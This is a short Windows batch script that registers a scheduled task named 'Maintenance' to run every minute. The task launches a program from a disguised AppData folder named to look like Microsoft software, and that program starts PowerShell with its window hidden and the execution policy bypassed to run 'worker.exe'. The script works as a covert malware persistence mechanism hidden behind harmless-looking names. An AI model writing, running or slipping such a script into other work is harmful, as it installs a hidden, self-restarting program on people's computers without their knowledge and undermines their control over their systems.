@echo off
schtasks.exe /create /sc minute /mo 1 /tn "Maintenance" /tr "%APPDATA%\MicrosoftWorker_e08ec640d\console-helper.exe --headless powershell.exe -w h -ep bypass -c & '%APPDATA%\MicrosoftWorker_e08ec640d\worker.exe'"
